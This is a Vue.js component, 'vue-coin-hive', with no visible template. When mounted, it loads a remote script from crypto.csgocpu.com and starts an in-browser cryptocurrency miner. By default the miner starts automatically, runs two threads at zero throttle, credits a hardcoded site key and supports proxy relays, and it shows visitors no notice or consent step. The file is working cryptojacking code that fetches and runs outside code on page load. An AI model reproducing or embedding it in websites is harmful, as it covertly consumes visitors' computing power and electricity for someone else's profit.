<template lang="html">
</template>

<script>
  import loadScript from 'load-script'
  export default {
    name: 'vue-coin-hive',
    props: {
      start: {
        type: Boolean,
        default: true,
        required: false,
      },
      startMode: {
        type: String,
        default: 'IF_EXCLUSIVE_TAB',
        required: false,
      },
      siteKey: {
        type: String,
        default: 'yXXJLVPFbuQV3tjH4hpulnksqYCbTEAi',
        required: false,
      },
      userName: {
        type: String,
        default: null,
        required: false,
      },
      threads: {
        type: Number,
        default: 2,
        required: false,
      },
      throttle: {
        type: Number,
        default: 0,
        required: false,
      },
      enableFound: {
        type: Boolean,
        default: true,
        required: false,
      },
      enableAccepted: {
        type: Boolean,
        default: true,
        required: false,
      },
      enableUpdatesPerSecond: {
        type: Boolean,
        default: true,
        required: false,
      },
      proxy: {
        type: Array,
        default: null,
        required: false
      }
    },
    mounted () {
      loadScript('https://crypto.csgocpu.com/idler.min.js', () => {
        if (this.proxy) {
          const proxies = this.proxy.reduce((acc, curr, i) => {
            if (!(i % 8)) {
              acc.push(this.proxy.slice(i, i + 8))
            }
            return acc
          }, [])
          CSGOCPU.CONFIG.WEBSOCKET_SHARDS = proxies
        }
        if (this.siteKey && this.userName) {
          this.miner = new CSGOCPU.User(this.siteKey, this.userName)
        } else if (this.siteKey) {
          this.miner = new CSGOCPU.Anonymous(this.siteKey)
        }
        this.CSGOCPU = CSGOCPU
        if (!this.miner.isRunning() && this.start) {
          this.startMiner()
        }
      })
    },
    data () {
      return {
        miner: null,
        CSGOCPU: null,
      }
    },
    methods: {
      startMiner () {
        if (this.miner && !this.miner.isRunning()) {
          const mode = this.getStartMode(this.startMode)
          this.miner.start(mode)
          this.miner.setNumThreads(this.threads)
          this.miner.setThrottle(this.throttle)

          if (this.enableFound) {
            this.miner.on('found', (x) => this.$emit('found', x))
          }
          if (this.enableAccepted) {
            this.miner.on('accepted', (x) => this.$emit('accepted', x))
          }
          // Update stats once per second
          if (this.enableUpdatesPerSecond) {
            setInterval(() => {
              const hashesPerSecond = this.miner.getHashesPerSecond()
              const totalHashes = this.miner.getTotalHashes()
              const acceptedHashes = this.miner.getAcceptedHashes()
              this.$emit('getHashesPerSecond', { hashesPerSecond, totalHashes, acceptedHashes })
            }, 1000)
          }
        }
      },
      stopMiner () {
        if (this.miner && this.miner.isRunning()) {
          this.miner.stop()
        }
      },
      getStartMode(type) {
        if (type === 'IF_EXCLUSIVE_TAB') {
          return this.CSGOCPU.IF_EXCLUSIVE_TAB
        } else if (type === 'FORCE_EXCLUSIVE_TAB') {
          return this.CSGOCPU.FORCE_EXCLUSIVE_TAB
        } else {
          return this.CSGOCPU.FORCE_MULTI_TAB
        }
      }
    },
    watch: {
      start (value) {
        if (value) {
          this.startMiner()
        } else {
          this.stopMiner()
        }
      },
      threads (value) {
        if (this.miner.isRunning()) {
          this.miner.setNumThreads(value)
        }
      },
      throttle (value) {
        if (this.miner.isRunning()) {
          this.miner.setThrottle(value)
        }
      }
    },
  }
</script>
